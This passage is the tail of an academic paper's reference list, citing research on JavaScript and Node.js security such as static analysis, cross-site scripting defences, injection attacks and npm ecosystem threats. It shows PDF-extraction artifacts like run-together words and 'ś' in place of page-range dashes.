driven Node.js JavaScript applications. ACM SIGPLAN Notices 50, 10 (2015),
505ś519.
[33]Sergio Maffeis, JohnC Mitchell, andAnkur Taly. 2008. An operational semantics
for JavaScript. In Asian Symposium on Programming Languages and Systems .
Springer, 307ś325.
[34]IbériaMedeiros,NunoNeves,andMiguelCorreia.2015. Detectingandremov-
ing web application vulnerabilities with static analysis and data mining. IEEE
Transactions onReliability 65,1 (2015), 54ś69.
[35]Y.Nadji,P.Saxena,andD.Song.2009. Documentstructureintegrity:Arobust
basisforcross-sitescriptingdefense.In ProceedingsoftheNetworkandDistributed
SystemSecuritySymposium .
[36]Benjamin Barslev Nielsen, Behnaz Hassanshahi, and François Gauthier. 2019.
Nodest: Feedback-Driven Static Analysis of Node.Js Applications. In Proceedingsof the 2019 27th ACM Joint Meeting on European Software Engineering Conference
and Symposium on the Foundations of Software Engineering (Tallinn, Estonia)
(ESEC/FSE 2019) . Association for Computing Machinery, New York, NY, USA,
455ś465. https://doi.org/10.1145/3338906.3338933
[37]AndresOjamaaandKarlDüüna.2012. AssessingthesecurityofNode.jsplatform.
In2012 International Conference for Internet Technology and Secured Transactions .
IEEE,348ś355.
[38]Xiang Pan, Yinzhi Cao, Shuangping Liu, Yu Zhou, Yan Chen, and Tingzhe Zhou.
2016. Cspautogen: Black-boxenforcementof content securitypolicy uponreal-
worldwebsites. In Proceedingsof the 2016ACM SIGSAC ConferenceonComputer
and Communications Security . 653ś665.
[39]Jibesh Patra, Pooja N Dixit, and Michael Pradel. 2018. Conflictjs: finding and
understandingconflictsbetweenjavascriptlibraries.In Proceedingsofthe40th
InternationalConference onSoftwareEngineering . 741ś751.
[40]Joe Gibbs Politz, Spiridon Aristides Eliopoulos, Arjun Guha, and Shriram Kr-
ishnamurthi. 2011. ADsafety:type-basedverification of JavaScript Sandboxing.
InProceedingsofthe20thUSENIX conferenceonSecurity .USENIX Association,
12ś12.
[41]Michael Pradel, Parker Schuh, and Koushik Sen. 2015. TypeDevil: Dynamic type
inconsistency analysisforJavaScript.In 2015IEEE/ACM37thIEEEInternational
Conference onSoftwareEngineering , Vol. 1.IEEE,314ś324.
[42]Ripon KSaha,YingjunLyu, Hiroaki Yoshida,and Mukul RPrasad.[n.d.]. Elixir:
Effectiveobject-orientedprogramrepair.In 201732ndIEEE/ACMInternational
Conference onAutomatedSoftwareEngineering (ASE) . IEEE,648ś659.
[43]A Prasad Sistla, VN Venkatakrishnan, Michelle Zhou, and Hilary Branske. 2008.
CMV:Automaticverificationofcomplete mediationforJavaVirtualMachines.
InProceedings of the 2008 ACM symposium on Information, computer and commu-
nicationssecurity . ACM,100ś111.
[44]VarunSrivastava,MichaelDBond,KathrynSMcKinley,andVitalyShmatikov.
2011. A security policy oracle: detecting security holes using multiple API
implementations.In ACMSIGPLAN Notices , Vol. 46.ACM,343ś354.
[45]Cristian-AlexandruStaicuandMichaelPradel.2018. Freezingtheweb:Astudyof
redos vulnerabilities in javascript-based web servers. In 27th{USENIX}Security
Symposium( {USENIX}Security18) . 361ś376.
[46]Cristian-AlexandruStaicu,MichaelPradel,andBenjaminLivshits.2018.SYNODE:
Understandingand AutomaticallyPreventingInjectionAttacksonNODE.JS.
[47]Cristian-AlexandruStaicu,Daniel Schoepe,MusardBalliu,MichaelPradel,and
Andrei Sabelfeld. 2019. An Empirical Study of Information Flows in Real-World
JavaScript. In Proceedings of the 14th ACM SIGSAC Workshop on Programming
Languages and Analysisfor Security . 45ś59.
[48]BenStock,SebastianLekies,TobiasMueller,PatrickSpiegel,andMartinJohns.
2014. Preciseclient-sideprotectionagainstDOM-basedcross-sitescripting.In
23rd{USENIX}SecuritySymposium( {USENIX}Security14) . 655ś670.
[49]Mike Ter Louw and V.N. Venkatakrishnan. 2009. Blueprint: Precise Browser-
neutralPreventionofCross-siteScriptingAttacks.In IEEESymposiumonSecurity
and Privacy .
[50]P. Vogt, F. Nentwich, N. Jovanovic, E. Kirda, C. Kruegel, and G. Vigna. 2007.
Cross-sitescriptingpreventionwithdynamicdatataintingandstaticanalysis.In
Proceeding of the Network and Distributed System Security Symposium (NDSS.07) .
[51]WenhaoWang,XiaoyangXu,andKevinWHamlen.2017.Objectflowintegrity.In
Proceedingsofthe2017ACMSIGSACConferenceonComputerandCommunications
Security. 1909ś1924.
[52]FabianYamaguchi,NicoGolde,DanielArp,andKonradRieck.2014.Modelingand
discoveringvulnerabilitieswith codepropertygraphs. In 2014IEEESymposium
onSecurityand Privacy . IEEE,590ś604.
[53]XiaolanZhang,AntonyEdwards,andTrentJaeger.2002. UsingCQUALforStatic
Analysis of Authorization Hook Placement.. In USENIX Security Symposium .
33ś48.
[54]MarkusZimmermann,Cristian-AlexandruStaicu,CamTenny,andMichaelPradel.
2019. Small world with high risks: A study of security threats in the npm
ecosystem. In 28th{USENIX}Security Symposium( {USENIX}Security 19) . 995ś
1010.
279